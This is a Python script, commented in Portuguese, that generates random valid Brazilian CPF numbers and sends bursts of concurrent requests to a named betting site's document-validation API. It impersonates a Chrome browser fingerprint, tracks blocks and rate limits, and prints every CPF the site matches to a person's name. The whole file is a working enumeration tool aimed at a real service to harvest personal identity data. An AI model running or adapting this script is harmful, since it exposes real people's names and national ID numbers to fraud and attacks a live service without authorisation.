#!/usr/bin/env python3
"""
Injetor Same IP - 20 requisições simultâneas do mesmo IP/sessão
"""
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests

# Sessão GLOBAL compartilhada (mesmo IP para todas as threads)
SESSION = None
lock = threading.Lock()
resultados = {"validos": [], "ok": 0, "blocked": 0, "rate_limit": 0, "erro": 0}

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def worker(thread_id):
    """Worker usando sessão compartilhada"""
    global SESSION
    cpf = gerar_cpf()
    
    try:
        # Usa a mesma sessão para todas as threads
        r = SESSION.post(
            "https://7k.bet.br/api/documents/validate",
            json={"number": cpf, "type": "cpf"},
            headers={"Content-Type": "application/json", "Origin": "https://7k.bet.br"},
            timeout=10
        )
        
        status = r.status_code
        
        with lock:
            if status == 200:
                try:
                    nome = r.json().get("data", {}).get("name", "N/A")
                except:
                    nome = "N/A"
                resultados["validos"].append({"cpf": cpf, "nome": nome})
                resultados["ok"] += 1
                print(f"[{thread_id+1:2d}] ✅ {cpf[:3]}.{cpf[3:6]}... | {nome[:25]}")
            elif status == 400:
                resultados["ok"] += 1
                print(f"[{thread_id+1:2d}] ❌ {cpf[:3]}.{cpf[3:6]}...")
            elif status == 403:
                resultados["blocked"] += 1
                print(f"[{thread_id+1:2d}] 🚫 403 BLOCKED")
            elif status == 429:
                resultados["rate_limit"] += 1
                print(f"[{thread_id+1:2d}] ⏳ 429 RATE LIMIT")
            else:
                resultados["erro"] += 1
                print(f"[{thread_id+1:2d}] ❓ {status}")
        
        return status
        
    except Exception as e:
        with lock:
            resultados["erro"] += 1
            print(f"[{thread_id+1:2d}] 💥 {str(e)[:30]}")
        return -1

def injetar_same_ip(num_threads=20):
    """Injeta N requisições do mesmo IP"""
    global SESSION, resultados
    
    # Reset resultados
    resultados = {"validos": [], "ok": 0, "blocked": 0, "rate_limit": 0, "erro": 0}
    
    # Cria UMA sessão compartilhada
    SESSION = requests.Session(impersonate="chrome120")
    
    print("="*55)
    print(f"💉 {num_threads} REQUISIÇÕES SIMULTÂNEAS - MESMO IP")
    print("="*55)
    print(f"   Sessão: chrome120 (compartilhada)")
    print(f"   Threads: {num_threads}")
    print("-"*55)
    
    inicio = time.time()
    
    # Dispara todas as threads ao mesmo tempo
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(worker, i) for i in range(num_threads)]
        for f in as_completed(futures):
            pass
    
    tempo = time.time() - inicio
    
    print("-"*55)
    print(f"⏱️  Tempo: {tempo:.2f}s | Velocidade: {num_threads/tempo:.1f} req/s")
    print(f"✅ OK: {resultados['ok']} | 🚫 403: {resultados['blocked']} | ⏳ 429: {resultados['rate_limit']} | 💥: {resultados['erro']}")
    
    if resultados["validos"]:
        print(f"\n🎯 VÁLIDOS: {len(resultados['validos'])}")
        for v in resultados["validos"]:
            cpf = v["cpf"]
            print(f"   {cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}")
    
    return resultados

def main():
    print("\n" + "="*55)
    print("🔬 TESTE: 20 REQUESTS SIMULTÂNEAS DO MESMO IP")
    print("="*55)
    
    # Teste 1: 20 requisições
    injetar_same_ip(20)
    
    print("\n⏳ Aguardando 3s...")
    time.sleep(3)
    
    # Teste 2: mais 20
    injetar_same_ip(20)
    
    print("\n⏳ Aguardando 3s...")
    time.sleep(3)
    
    # Teste 3: mais 20
    injetar_same_ip(20)
    
    print("\n" + "="*55)
    print("✅ TESTE COMPLETO!")
    print("="*55)

if __name__ == "__main__":
    main()







